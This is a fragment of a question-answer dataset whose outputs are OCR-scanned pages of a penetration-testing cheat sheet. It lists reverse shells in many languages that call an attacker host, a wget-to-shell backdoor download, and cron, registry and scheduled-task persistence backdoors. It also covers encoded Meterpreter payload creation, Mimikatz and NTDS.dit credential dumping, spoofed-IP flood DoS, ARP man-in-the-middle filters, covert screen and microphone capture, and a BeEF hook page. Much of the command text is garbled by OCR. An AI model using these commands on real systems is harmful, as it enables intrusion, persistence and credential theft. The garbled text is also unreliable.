    "output": "DATA\nThank You.\nquit\n43\nREVERSE SHELLS [11 [31 [41\nNETCAT (* START LISTENER ON ATTACK BOX TO CATCH SHELL)\nnc 10.0.0.1 1234 -e /bin/sh Linux reverse shell\nnc 10.0.0.1 1234 -e cmd.exe Windows reverse shell\nNETCAT (SOME VERSIONS DON'T SUPPORT -E OPTION)\nnc -e /bin/sh 10.0.0.1 1234\n\nNETCAT WORK-AROUND WHEN -E OPTION NOT POSSIBLE\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/fl/bin/sh -i 2 &line l0.0.0.1 1234 /tmp/f\n\nPERL\nperl -e 'use Socket; $i~\"10.0.0.l\"; $p~1234; socket(S,PF INET, SOCK STREAt1,\ngetprotobjname(\"tcp\") I; if(connect(S,sockaddr in($p,inet-aton($i) I iT!\nopen(STDIN,\" &S\") ;open(STDOUT,\" &S\"); open(ST~ERR,\" &8\"17 exec(\"/bin/sh\ni\" I; l;'\nPERL WITHOUT /BIN/SH\nperl -t1IO -e '$p~fork;exit,if($p);$c~new\nIO: :Socket: :INET(PeerAddr,\"attackerip:4444\") ;STDIN- fdopen($c,r) ;$-\nfdopen($c,w) ;sjsteffi$ while ·'\n\nPERL FOR WINDOWS\nperl -MIO -e '$c=new IO: :Socket: :INET(PeerAddr,''attackerip:4444'') ;STDIN\nfdopen($c,r) ;$-- fdopen($c,w) ;system$ while ·'\n\nPYTHON\npython -c 'import socket, subprocess, os; s=socket. socket (socket ..; ;F_ INET,\nsocket.SOCK_STREAL1); s.connect( (\"10.0.0.1\",1234)); os.dup2 (s.fileno() ,0);\nos.dup2(s.fileno(l,1); os.dup2(s.file:oo(),2);\np~subprocess.call( 1\"/bin/sh\",\"-i\"] I;'\n\nBASH\nbash -i & /dev/tcp/10.0.0.1/8080 0 &1\n\nJAVA\nr ~ Runtime.getRuntime()\np ~ r.exec( 1\"/bin/bash\",\"-c\",\"exec 5 /dev/tcp/10.0.0.1/2CJ2;cat &5 1\nwhile read line; do \\$:ine 2 &5 &5; done\"] as String[])\np.waitFor()\nPHP\nphp -r '$sod:~fsockopen(\"10.0.0.1\", 1234) ;exec(\"/bin/sh -i &3 &3 2 &3\");'\n44\n\nRUBY\nruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234) .to i; exec\nsprintf(\"/bin/sh -i &%d &%d 2 &%d\",f,f,f)'\nRUBY WITHOUT /BIN/ SB\nby -rsocket -e 'exit if\nfork;c=TCPSocket.new(\"attackerip\",\"4444\");while(crnd=c.gets);IO.popen(cmd,11r\n\"I { liolc.print io.read}end'\n\nRUBY FOR WINDOWS\nruby -rsocket -e\n'c=TCPSocket.new(\"attacY..erip\",\"4444\");while(crnd=c.gets);IO.popen{cmd,\"r11) {I\niolc.print io.read}end'\n\nTELNET\nrm -f /tmp/p; mknod /tmp/p p && telnet attacl:erip 4444 0/tmp/p\n--OR--\ntelnet attacl:erip 4444 I /bin/bash I telnet attackerip 4445\n\nXT ERM\nxterm -displaj 10.0.0.1:1\no Start Listener: Xnest :1\no Add permission to connect: xhost +victimiP\nMise\nwget hhtp:// server /backdoor.sh -0- I sh Downloads and runs backdoor.sh\n45\n\nPERSISTENCE\nFOR LINUX PERSISTENCE (ON ATTACK BOX)\ncrontab -e : set for every 10 min\n0-59/10 ' ' ' ' nc ip 7\"\" -e /bin/bash\nWINDOWS TASK SCHEDULER PERSISTENCE (START TASK SCHEDULER)\nsc config schedule start~ auto\nnet start schedule\nat 13:30 ''''C:\\nc.exe ip 7~7 -e cmd.exe''''\n\nWINDOWS PERSISTENT BACKDOOR WITH FIREWALL BYPASS\n1. REG add HKEY CURRENT USER\\Software\\l1icrosoft\\Windows\\CurrentVersion\\Run\n/v firewall 7t REG SZ /d \"c:\\windows\\system32\\backdoor.exe\" /f\n2. at 19:00 /every:t1,T,W,Th,F cmd /c start \"%USERPROFILE%\\backdoor.exe\"\n3. SCHTASKS /Create /RU \"SYSTEt1\" /SC l1INUTE /t10 45 /TN FIREWALL /TR\n\"%USERPROFILE%\\backdoor.exe\" /ED 12/12/2012\nREMoTE PAYLOAD DEPLO\"!MENT VIA SMB OR WEBDAV [ 6]\nVia SMB:\n1. From the compromised machine, share the payload folder\n2. Set sharing to 'Everyone'\n3. Use psexec or wmic command to remotely execute payload\nVia WebDAV:\n1. Launch Metasploit 'webdav file server' module\n2. Set following options:\nlocalexe~true\nlocalfile~ payload\nlocalroot~ payload directory\ndisablePayloadHandler~true\n3. Use psexec or wmic command to remotely execute payload\npsexec \\\\ remote ip /u domain\\compromised_user /p password \"\\\\payload\nip \\test\\msf.exe\"\n\nOR -\nwmic /node: remote ip /user:domain\\compromised user //password:password\nprocess call create \"\\ \\ payload ip \\test\\msf.exe\"\n46\n\nTUNNELING\n\nFPIPE - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2\nfpipe.exe l 1234 -r 80 2.2.2.2\n\nSOCKS.EXE- SCAN INTRANET THROUGH SOCKS PROXY\nOn redirector (1.1.1.1):\nsocks.exe -i1.1.1.1 -p 8C80\nOn attacker:\nModifj /etc/proxjchains.conf:\nComment out:\nComment out: 9050\nAdd line: socks4 1.1.1.1 8080\nScan through socks prox1:\nproxjchains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2\n\nSOCAT - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2\nsoca~ TCP4:LISTEN:1234 TCP4:2.2.2.2:80\nSTUNNEL - SSL ENCAPSULATED NC TUNNEL (WINDOWS & LINUX) [ 8]\n0!1 attacker (client):\nModifj /stunnel.conf\nclien:. = jes\n[netcat client]\naccept ~ 5555\nconnect ~ -~istening IP-:4444\nOn victim (listening server)\nl1odifJ /s:.unnel.conf\nclient = no\n[ne~cat server]\naccept ~ 4444\nconnect =\nC:\\ nc -vlp ----\nOn attacker (clien~):\n# nc -nv 12-.0.C.1 5555\nq-\nGoOGLE HACKING\none\nnumrange: [#]-[#] search within a number range\ndate: [ #] search within past [#] months\nlink: [url] find pages that link to [url]\nrelated: [url] find pages related to [url]\nintitle: [string] find pages with [string] in title\ninurl: [string] find pages with [string] in url\nfiletjpe: [xls] find files that are xls\nphonebook: [name] find phone book listings of [name]\n\nVIDEO TELECONFERENCING\n\nPOLYCOM\ntelnet ip\n#Enter 1 char, get uname:pwd\nhttp:// ip /getsecure.cgi\nhttp:// ip /era rcl.htm\nhttp:// ip /a securitj.htm\nhttp:// ip /a-rc.htm\n\nTANDBERG\nhttp:// ip /snapctrl.ssi\n\nSONY WEBCAM\nhttp:// ip /commard/visca-gen.cgi?visca~ str\n8101046202FF : Freeze Camera\n~8\n\nNMAP\n\nSCAN TYPES\n-sP ping scan -su udp scan\n-ss syn scan -so protocol scan\n-sT connect scan"
  },
  {
    "input": "What are the key options and commands used for network scanning, firewall evasion, and result processing with Nmap?",
    "summary": "The text provides various nmap command options for scanning networks, including port scanning, version detection, OS detection, and firewall evasion techniques. It also includes commands for converting nmap XML files to HTML, generating a live host file, comparing scan results, and performing DNS reverse lookups. Additionally, it outlines a method for testing IDS with a XMAS scan using decoy IPs and spoofing.",
    "output": "OPTIONS\n-pl-65535 ports -sv : version detection\n-T[0-5] o~5m, 1~15s, 2~.4s -PN : no ping\n-n no dns resolution -6 : IPv6 scan\n-0 OS detection --randomize-hosts\n-A aggressive scan\nI\n\nOUTPUT INPUT\n-ox file write to xml file\n-oG file write to grep file\n-oA file save as all 3 formats\n-iL file read hosts from file\n-exclude file file excludes hosts in file\nAD~CED OPTIONS\n-sV -p# --script~banner -ttl : set TTL\n-trace route --script script.\n\nFIREWALL EVASION\n-f fragment packets --spoof-mac mac\n-s ip spoof src --data-length size\n-g # spoof src port (append random data)\n-D ip , ip Decoy --scan-delay 5s\n--mtu # set l1TU size\n\nCONVERT NMAP XML FILE TO HTML:\nxsltproc nmap.xml -o nmap.html\n\nGENERATE LIVE HOST FILE:\nnmap -sP -n -oX out.xml 1.1.1.0/24 2.2.2.0/24 I grep \"Nmap\" I cut -d \" \" -f\n5 live hosts.txt\n\nCOMPARE NMAP RESULTS\nndiff scanl.xml scan2.xml\n\nDNS REVERSE LOOKUP ON IP RANGE\nnmap -R -sL -dns-server server 1.1.1.0/24\nIDS TEST (XMAS SCAN WITH DECOY IPS AND SPOOFING)\nfor x in {l .. lOOOO .. l);do nmap -T5 -sX -S spoof-source-IP -D comma\nseperated with no spaces list of decoy IPs --spoof-mac aa:bb:cc:dd:ee:ff -\ne ethO -Pn targeted-IP. ;done\n51"
  },
  {
    "input": "What are the key tools and techniques used for network scanning, packet capturing, and exploitation in the provided text?",
    "summary": "The text provides a comprehensive list of commands and tools used in network security testing, including Wireshark, Netcat, SQLMap, Metasploit, Ettercap, Mimikatz, Scapy, and Perl. It covers various aspects like port scanning, backdoor shells, privilege escalation, and capturing network traffic. Additionally, it includes details on using these tools for tasks such as creating reverse shells, capturing screen or microphone data, and extracting password hashes from systems. The text also outlines how to use these tools for social engineering, banner grabbing, and other network-related activities.",
    "output": "WIRE SHARK\neth.addr/eth.dst.eth.src MAC\nrip.auth.passwd RIP password\nip.addr/ip.dst/ip.src (ipv6.) IP\ntcp.port/tcp.dstport/tcp.srcport TCP ports\ntcp.flags (ack,fin,push,reset,syn,urg) TCP flags\nudp.port/udp.dstport/udp.srcport UDP ports\nhttp.authbasic Basic authentication\nhttp.www_authentication HTTP authentication\nhttp.data HTTP data portion\nhttp.cookie HTTP cookie\nhttp.referer HTTP referer\nhttp.server HTTP Server\nhttp.user agent HTTP user agent string\nwlan.fc.type eq 0 802.11 management frame\nwlan.fc.type eq 1 802.11 control frame\nwlan.fc.type eq 0 802.11 data frame\nwlan.fc.type subtype eq 0 (1~reponse) 802.11 association request\nwlan.fc.type_subtype eq 2 (3~response) 802.11 reassociation req\nwlan.fc.type_subtype eq 4 (S~response) 802.11 probe request\nwlan.fc.type_subtype eq 8 802.11 beacon\nwlan.fc.type subtype eq 10 802.11 disassociate\nwlan.fc.type=subtype eq 11 (12~deauthenticate) 802.11 authenticate\n\nCOMPARISON OPERATORS\neq OR\nne OR !~\ngt OR\nlt OR\nge OR\nle OR\n\nLOGICAL OPERATORS\nand OR &&\nor OR II\nxor OR\nnot OR !\n52\n\nNET CAT\nBAs :res\nConnect to [TargetiP] Listener on [port]:\n$ nc [ Targeti P] [port]\nStart Listener:\n$ nc -1 -p [port]\n\nPORT SCANNER\nTCP Port Scanner in port range [startPort] to [endPort]:\n$ nc -v -n -z -wl [TargetiP] [startPort]-[endPort]\nFl:LE TRANSFERS\nGrab a [filename] from a Listener:\n1. Start Listener to push [filename]\n$ nc -1 -p [port] [filename]\n2. Connect to [TargetiP] and Retrieve [filename]\n$ nc -w3 [TargetiP] [port] [filename]\nPush a [filename] to Listener:\n1. Start Listener to pull [filename]\n$ nc -1 -p [port] [filename]\n2. Connect to [TargetiP] and push [filename]\n$nc -w3 [TargetiP] [port] [filename]\n\nBACKDOOR SHELLS\nLinux Shell:\n$ nc -1 -p [port] -e /bin/bash\nLinux Reverse Shell:\n$ nc [LocaliP] [port] -e /bin/bash\nWindows Shell:\n$ nc -1 -p [port] -e cmd.exe\nWindows Reverse Shell:\n$ nc [LocaliP] [port] -e cmd.exe\n53\n\nVLC STREAMING\n# Use cvlc (command line VLC) on target to mitigate popups\nCAPTURE AND STREAM THE SCREEN OVER UDP TO <ATTACKER:IP>: 1234\n# Start a listener on attacker machine\nvlc udp://@:1234\n\nOR -\n# Start a listener that stores the stream in a file.\nvlc udp://@:1234 :sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,\nab=128,channels=2,samplerate=44100):file{dst=test.mp4) :no-sout-rtp-sap\n:no-sout-standard-sap :ttl=1 :sout-keep\n# This may make the users screen flash. Lower frame rates delay the video.\nvlc screen:// :screen-fps=25 :screen-caching=100\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):udp{dst= attackerip :1234) :no-sout-rtp-sap :no-sout\nstandard-sap :ttl=1 :sout-keep\n\nCAPTURE AND STREAM THE SCREEN OVER HTTP\n# Start a listener on attacker machine\nvlc http://server.example.org:BOBO\n-- OR -\n# Start a listener that stores the stream to a file\nvlc http://server.example.org:BOBO -\nsout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,samp\nlerate=44100):file{dst=test.mp4)\n# Start streaming on target machine\nvlc screen:// :screen-fps=25 :screen-caching=100\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):http{mux=ffmpeg{mux=flv),dst=:8080/) :no-sout-rtp-sap :no\nsout-standard-sap :ttl=1 :sout-keep\n\nCAPTURE AND STREAM OVER BROADCAST\n# Start a listener on attacker machine for multicast\nvlc udp://@ multicastaddr :1234\n# Broadcast stream to a multicast address\nvlc screen:// :screen-fps=25 :screen-caching=100\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):udp{dst= multicastaddr :1234) :no-sout-rtp-sap :no-sout\nstandard-sap :ttl=1 :sout-keep\n\nCAPTURE AND RECORD YOUR SCREEN TO A F:ILE\nvlc screen:// :screen-fps=25 :screen-caching=100\n:sout=#transcode{vcodec=h264,vb=O,scale=O,acodec=mp4a,ab=128,channels=2,sam\nplerate=44100):file{dst=C:\\\\Program Files (x86)\\\\VideoLAN\\\\VLC\\\\test.mp4)\n:no-sout-rtp-sap :no-sout-standard-sap :ttl=1 :sout-keep\n\nCAPTURE AND STREAM THE M:ICROPHONE OVER UDP\nvlc dshow:// :dshow-vdev=11None\" :dshow-adev=\"Your Audio Device11\n54\nSSH\n/etc/ssh/ssh known hosts #System-wide known hosts\n-/.ssh/known=hosts- #Hosts user has logged into\nsshd-generate #Generate SSH keys (DSA/RSA)\nssh keygen -t dsa -f /etc/ssh/ssh host dsa key #Generate SSH DSA keys\nssh keygen -t rsa -f /etc/ssh/ssh=host=rsa key #Generate SSH RSA keys\n~ If already in ssh session, press SHIFT -C to configure tunnel\n~ Port forwarding must be allowed on target\n~ /etc/ssh/sshd_config - AllowTcpForwarding YES\n\nTO ESTABLISH AN SSH CONNECTION ON DIFFERENT PORT\nssh root@2.2.2.2 -p 8222\nSETUP Xll FORWARDING FROM TARGET, FROM ATTACK BOX RUN\nxhost+\nvi -/.ssh/config- Ensure 'ForwardXll yes'\nssh -X root@2.2.2.2\nREMoTE PORT FORWARD ON 808 0 , FORWARD TO ATTACKER ON 4 43\nssh -R8080:12-.0.0.1:443 root@2.2.2.2.\nLoCAL PORT FORWARD ON PORT 8080 ON ATTACK BOX AND FORWARDS\n\nTHROUGH SSH TUNNEL TO PORT 3300 ON INTERNAL TARGET 3. 3. 3. 3\nssh -18080:3.3.3.3:443 root@2.2.2.2\n\nDYNAMIC TUNNEL USED IN CONJUNCTION WITH PROXYCHAINS . ENSURE\n/ETC/PROXYCHAINS. CONF IS CONFIGURED ON CORRECT PORT (1080)\nssh -Dl080 root@2.2.2.2\nIn a separate terminal run:\nproxychains nmap -sT -p80,443 3.3.3.3\n55\n\nMETASPLOIT\nmsfconsole r file.rc Load resource file\nmsfcli I grep exploit/window List Windows exploits\nrnsfencode 1 List available encoders\nmsfpayload h List available payloads\nshow exploits Display exploits\nshow auxiliary Display auxiliary modules\nshow payloads Display payloads\nsearch string Search for string\ninfo module Show module information\nuse module Load exploit or module\nshow options Displays module options\nshow advanced Displays advanced options\nset option value Sets a value\nsessions -v List session: -k # (kill)\n-u # (upgrade to Meterpreter)\nsessions -s script Run Meterpreter script on all\nsessions\njobs -1 List all jobs (-k # - kill)\nexploit -j Run exploit as job\nroute add ip nmask sid Pivoting\nloadpath /home/modules Load 3rd party tree\nirb Live Ruby interpreter shell\nconnect -s ip 443 SSL connect (NC clone I\nroute add ip mask session id Add route ·through session (pivot)\nexploit/multi/handler - set Advanced option allows for multiple\nExitOnSession False shells\nset ConsoleLogging true (also Enables logging\nSessionLogging)\nCREATE ENCODED METERPRETER PAYLOAD (FOR LINUX: -T ELF -o\nCALLBACK)\n./msfpayload windows/meterpreter/reverse tcp LHOST~ ip LPORT~ port R I\n./msfencode -t exe -o callback.exe -e x86/shikata_ga nai -c 5\n\nCREATE BIND METERPRETER PAYLOAD\n./msfpayload windows/meterpreter/bir.d_tcp RP.OST~ ip LPORT~ port X\ncb.exe\n\nCREATE ENCODED PAYLOAD USING MSFVENOM USING EXE TEMPLATE\n./msfvenorn --payload windows/meterpreter/reverse~tcp --format exe\ntemplate calc.exe -k --encoder x86/shikata ga nai -i 5 LHOST~l.l.l.l\nLPORT~443 callback.exe\n56\nSTART MSF DB (BT5 = MYSQL, KAL:r = POSTGRESQL)\n/etc/rc.d/rc.mysqld start\nmsf db_create root:pass@localhost/metasploit\nmsf load db mysql\nmsf db connect root:pass@localhost/metasploit\nmsf db=import nmap.xml\nKali ---\n# service postgresql start\n# service metasploit start\nPASS A SHELL (BY DEFAULT WJ:LL LAUNCH NOTEPAD AND :INJECT)\nmsf use post/windows/manage/multi meterpreter inJect\nmsf set IPLIST attack ip -\nmsf set LPORT callback port\nmsf set PIDLIST PID to inject, default creates new notepad\nmsf set PAYLOAD windows/meterpreter/reverse_tcp\nmsf set SESSION meterpreter session ID\n\nHTTP BANNER SCAN ON :INTERNAL NETWORK\nmsf route add ip/range netmask meterpreter ID\nmsf use post/multi/gather/ping sweep # Set options and run\nmsf use /auxiliary/scanner/portscan/tcp # Set options and run\nmsf hosts-u-S x.x.x -R #Searches for x.x.x.' and sets\n# RHOSTS\nmsf use auxiliary/scanner/http/http version # Set options and run\nmsf services -v -p 80-S x.x.x -R - #Displays IPs x.x.x.' with port\n# 80 open\n57\n\nMETERPRETER\nhelp List available commands\nsysinfo Display system info\nps List processes\ngetpid List current PID\nupload file C:\\\\Program\\ Files\\\\ Upload file\ndownload file Download file\nreg command Interact with registry\nrev2self Revert to original user\nshell Drop to interactive shell\nmigrate PID Migrate to another PID\nbackground Background current session\nkeys can (startjstopjdumpj Start/Stop/Dump keylogger\nexecute -f cmd.exe -i Execute cmd.exe and interact\nexecute -f crnd.exe -i -H -t Execute cmd.exe as hidden process\nand with all tokens\nhas dump Dumps local hashes\nrun script Executes script\n(/scripts/meterpreter)\nport fwd [add I delete] L 1r.o.o.1 1 Port forward 3389 through session. I\n443 -r 3.3.3.3 -p 3389 Rdesktop to local port 443\n\nPRIVILEGE ESCALATION\nuse priv\ngetsystem\nIMPERSONATE TOKEN (DROP TOKEN WILL STOP IMPERSONATING)\nuse incognito\nlist tokens -u\nimpersonate token domain\\\\user\n\nNMAP THROUGH METERPRETER SOCKS PROXY\n1. msf sessions #Note Meterpreter ID\n2. msf route add 3.3.3.0 255.255.255.0 id\n3. msf use auxiliarJ/server/socks4a\n4. rnsf run\n5. Open new shell and edit /etc/proxychains.conf\ni. #proxy_d ns\nii. #socks4 1r.0.0.1 9050\niii. socks4 1. 1.1.1 1080\n6. Save and Close conf fi:e\nproxychains nmap -sT -Pn -p80,:35,s45 3.3.3.3\n\nRAILGUN - WINDOWS API CALLS TO POP A MESSAGE BOX\nrneterprete~ irb\nclient. railgun. user32. t.jessageBoxA ( 0, \"got\", 11JOU\", \"HB ~OK\")\n58\nCREATE PERSXSTENT WrNDOWS SERVICE\nmsf use post/windows/manage/persistence\nmsf· set LHOST attack ip\nmsf set LPORT callback port\nmsf. set PAYLOAD_TYPE TCPIHTTPIHTPS\nmsf.· set REXENAHE filename\nmsf set SESSION meterpreter session id\nmsf. set STARTUP SERVICE\n\nGATHER RECENTLY ACCESSED FXLES AND WEB LXNKS\nmeterpreter run post/windows/gather/dumplinks\nSPAWN NEW PROCESS AND TREE C: \\\nexecute -H -f cmd.exe -a '/c tree /F /A c:\\ C:\\temp\\tree.txt'\n59\n\nETTERCAP\n~-IN-THE-MIDDLE WITH FILTER\nettercap.exe -I iface -M arp -Tq -F file.ef MACs I IPs I Ports\nt1ACs I IPs I Ports\n#i.e.: I 180,443 I I ~ anJ t1AC, anj IP, ports 80,443\n~-IN-THE-MIDDLE ENTIRE SUBNET WITH APPLIED FILTER\nettercap -T -M arp -F filter II II\n\nSWITCH FLOOD\nettercap -TP rand flood\n\nETTERCAP FILTER\n\nCOMPILE ETTERCAP FILTER\netterfilter filter.filter -o out.ef\n\nSAMPLE FILTER - KILLS VPN TRAFFIC AND DECODES HTTP TRAFFIC\nif lip.proto ~~ UDP && udp.dst ~~ 500) I\ndrop I I;\nhllll; }\nif I ip. src ~~ ' ip ' ) (\nif ltcp.dst ~~ 80) (\nif lsearchiDATA.data, \"Accept-Encoding\")) (\nreplace(\"Accept-Encoding\",\"Accept-Rubbish!\");\nrnsg(''Replaced Encoding\\n'');\n60\n\nMIMIKATZ\n1. Upload mimikatz.exe and sekurlsa.dll to target\n2. execute mirnikatz\n3. mimikatz# privilege: :debug\n4. mimikatz# injeet::proeess lsass.exe sekurlsa.dll\n5. mimikatz# @getLogonPasswords\n\nHPING3\nDoS FROM SPOOFED IPs\nhping3 targetiP --flood --frag --spoof ip --destport # --syn\n\nARPING\n\nARP SCANNER\n./arping -I eth# -a # arps\n\nWINE\n\nCOMPILE EXE IN BACKTRACK\ned /root/.wine/drive e/HinGW/bin\nwine gee -o file.exe /tmp/ eode.e\nwine file.exe\n\nGRUB\n\nCHANGE ROOT PASSWORD\nGRUB Henu:Add 'single' end of kernel line. Reboot. Change root pass. reboot\n\nHYDRA\n\nONLINE BRUTE FORCE\nhydra -1 ftp -P words -v targetiP ftp\n61\n\nJOHN THE RIPPER\n\nCRACKING WITH A WORDLIST\n$ ./john -wordfile:pw.lst -format: format hash.txt\n\nFORMAT EXAMPLES\njohn --format~des username:SDbsuge8iC58A\njohn --format~lm username:$L~$a9c604d244c4e99d\njohn --format~md5 $1$12345678$aiccj83HRD8o6ux1bVx\"D1\n$ john --format~raw-sha1 A9993E364-06816A8A3E25\"1-850C26C9CDOD89D\n# For --format~netlmv2 replace $NETLM with $NETLMv2\n$ john --format~netlm\n$NETLt1$112233445566\"\"88$0836F0858124F338958-5F81951905DD2F85252CC-318825\nusername:$NETLt1$ll2233445566\"\"88$0836F0858124F338958\"5F81951905DD2F85252CC\"\n318825\nusername:$NETLt1$112233445566\"\"88$0836F0858124F338958-5F81951905DD2F85252CC\"\n318825:::::::\n# Exactly 36 spaces between USER and HASH (SAP8 and SAPG)\n$ john --format~sapb\nROOT $8366A4E9E68\"2C80\nusername:ROOT $8366A4E9E68\"2C80\n$ john --format~sapg\nROOT $1194E38F1489F3F8DA18181F14DE8\"0E\"8DCC239\nusername:ROOT\n$1194E38F1489F3F8DA18181F14DE8-0E-8DCC239\n$ john --format~sha1-gen\n$SHA1p$salt$59b3e8d63-cf9\"edbe2384cf59cb\"453dfe30-89\nusername:$SHA1p$salt$59b3e8d63-cf9\"edbe2384cf59cb-453dfe30-89\n$ john --format~zip\n$zip$'0'1'8005b1b\"d07\"\"08d'dee4\nusername:$zip$'0'1'8005b1b-d0\"-\"08d'dee4\n\nPASSWORD WORDLIST\n\nGENERATE WORDLIST BASED OFF SINGLE WORD\n#Add lower(@), upper(,), ~umber(%), and symbol( I to the end of the word\ncrunch 12 12 -t baseword@,%' wordlist.txt\nUse custom special character set and add 2 numbers then special character\nmaskprocessor -custom-charset1~\\!\\@\\#\\$ baseword?d?d?l wordlist.txt\n62\nVSSOWN [2l\n1. Download: http://ptscripts.googlecode.com/svn/trunk/windows/vssown.vbs\n2. Create a new Shadow Copj\na. cscript vssown.vbs /start (optional)\nb. cscript vssown.vbs /create\n3. Pull the following files frorr. a shadow copj:\na. COpj\n\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopj[X]\\windows\\\nntds\\ntds.dit .\nb. copj\n\\\\?\\GLOBALROOT\\Device\\Harddisf:VolumeShadowCopj[X]\\windows\\\nSjstem32\\config\\SYSTEM .\nC. COpj\n\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopj[X]\\windows\\\nsjstem32\\con:'ig\\SAt1 .\n4. Copj files to attack box.\n5. Download tools: http://www.ntdsx~ract.com/downloads/ntds dump_hash.zip\n6. Configure and Make source code for libesedb from the extracted package\na. cd libesedb\nb. chmod +x configure\nc. ./configure && make\nUse esedbdumphash to ex~ract the datatable from ntds.dit.\na. cd esedbtools\nb. . I esedbdumphash .. I .. I ntds. di t\n8. 8a.Use dsdump.pj to dump hashes from datatable using bootkej from\nSYSTEt1 hive\na. cd .. I .. I creddump/\nb. pjthon . /dsdurr.p.pj .. /SYSTEtc\n.. /libesedb/esedbtools/ntds.dit.export/datatable\n9. 8b.Use bkhive and samdump2 to dump hashes from SN1 using bootkej from\nSYSTEt1 hive.\na. bkhive SYSTEM kej.txt\nb. samdump2 SN1 kej. txt\n10. Dump historical hashes\na. pjthon ./dsdumphistorj.pj .. /sjstem\n.. /libesedb/esedbtools/ntds.dit.export/datatable\n63\n\nFILE HASHING\n\nHASH LENGTHS\nt1D5 16 b:~tes\nSHA-1 20 b:~tes\nSHA-256 32 b:~tes\nSHA-512 64 bjtes\n\nSOFTWARE HASH DATABASE\nhttp://isc.sans.edu/tools/hashsearch.htm~\n# dig +short md5 .md5.dshield.org TXT\nResult = '' filename I source '' i.e. ''cmd.exe I NIST''\n\nMALWARE HASH DATABASE\nhttp: I /www. team-c:~mru. org/ Services/t1HR\n# dig +short [t1D51 SHA-1] .malware.hash.cjmrc.J.com TXT\nResult = last seen timestamp AV detection rate\nConvert timestamp= perl-e 'print scalar localtime( timestamp ) , ''\\n'''\n\nFILE METADATA SEARCH\nhttps://fileadvisor.bit9.com/services/search.aspx\n\nSEARCH VIRUSTOTAL DATABASE\nhttps://www.virustotal.com/#search\n64\n\nCOMMON USER-AGENT STRINGS\nMozilla/4.0 (compatible; MSIE 6.0; Windows IE 6.0/WinXP 32-bit\nNT 5.1; SV1)\nMozilla/ 4. 0 (compatible; l~SIE 7. 0; Windows IE ~.0/WinXP 32-bit\nNT 5.1; SV1; .NET CLR 2.0.50-27)\nMozilla/4.0 (compatible; MSIE 8.0; Windows IE 8.0/WinVista 32-bit\nNT 6.0; Trident/4.0; Mozilla/4.0\n(compatible; MSIE 6.0; Windows NT 5.1; SV1)\n; .NET CLR 3.5.30729)\nMozilla/ 5. 0 (compatible; t~SIE 9. 0; Windows IE 9.0/Win- 32-bit\nNT 6.1; Trident/5.0)\nMozilla/5.0 (compatible; t~SIE 9.0; Windows IE 9.0/Win- 64-bit\nNT 6.1; WOW64; Trident/5.0)\nMozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Firefox 5.0/Win~ 64-bit\nGecko/20100101 Firefox/5.0\nMozilla/5.0 (Windows NT 5.1; rv:13.0) Firefox 13.0/WinXP 32-bit\nGecko/20100101 Firefox/13.0.1\nMozilla/5.0 (Windows NT 6.1; WOW64; rv:1'.01 Firefox 1'.0fWin~ 64-bit\nGecko/20100101 Firefox/1'.0\nMozilla/5.0 (X11; Ubuntu; Linux x86 64; Firefox 1-.o/Linux\nrv:17.0) Gecko/20100101 Firefox/1-.0\nMozilla/5.0 (Macintosh; Intel Mac OS X 10.-; Firefox 1'.0fMacOSX 10.-\nrv: 17. 0) Gecko/20100101 Firefox/17.0\nMozilla/5.0 (Macintosh; Intel Mac OS X 10.8; Fire fox 1'. Ofl~acOSX 10.8\nrv:17.0) Gecko/20100101 Firefox/1'.0\nMozilla/5.0 (Windows NT 5.1) Chrome Generic/WinXP\nAppleWebKit/53'.11 (KHTML, like Gecko)\nChrome/23.0.1271.9- Safari/53-.11\nMozilla/5.0 (Windows NT 6.1) Chrome Generic/Win'\nAppleWebKit/537 .11 (KHTl~L, like Gecko)\nChrome/23.0.12-1.9- Safari/53-.11\nMozilla/5.0 (X11; Linux x86 64) Chrome Generic/Linux\nAppleWebKit/53' .11 (KHTl~L, like Gecko)\nChrome/23.0.1271.9' Safari/537.11\nMozilla/5.0 (Macintosh; Intel Mac OS X Chrome Generic/l~acOSX\n10 8 2) AppleWebKit/537.11 (KHTML, like\nGe~ko) Chrome/23.0.12-1.101 Safari/53'.11\nMozilla/5.0 (Windows NT 6.1; WOW64) Chrome 13.0/Win' 64-bit\nAppleWebKit/535.1 (KHTML, like Gecko)\nChrome/13.0.782.112 Safari/535.1\nMozilla/5.0 (Macintosh; Intel Mac OS X Safari 6.0/MacOSX\n10 ~ 5) AppleWebKit/536.26.17 (KHTML, like\nGe~ko) Version/6.0.2 Safari/536.26.17\nMozilla/5.0 (iPad; CPU OS 6 0 1 like Mac OS Mobile Safari 6.0/iOS (iPad)\nX) AppleWebKit/536.26 (KHTML,-like Gecko)\nVersion/6.0 Mobile/10A523 Safari/8536.25\nMozilla/5.0 (iPhone; CPU iPhone OS 6 0 1 Mobile Safari 6.0/iOS\nlike l~ac OS X) AppleWebKit/536.26 (KHTML, (iPhone)\nlike Gecko) Version/6.0 Mobile/10A523\nSafari/8536.25\nMozilla/5.0 (Linux; U; Android 2.2; fr-fr; Hobile Safari 4.0/Android\nDesire A8181 Build/FRF91) App3leWebKit/53.1\n(KHTl~L-;- like Gecko I Version/ 4. 0 Mobile\nSafari/533.1\n67\n\nHTML\n\nHTML BEEF HOOK WITH EMBEDDED FRAME\n!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\"\nhtml\nhead.\ntitle Campaign Title· /title\nscript\nvar commandModuleStr = ' script src=111 + window.location.protocol +\n'II' + window. location. host + ':8080/hook.js\"\ntype=\"text/javascript\" \\/script.';\ndocument.write(commandModuleStr);\n//Site refresh=window.setTimeout(function() {window.location.href='http://ww\nw.google.com/'},20000);\n/script.\n/head\nframeset rows=\"*,lpx\"\nframe src=\"http://www.google.com/\" 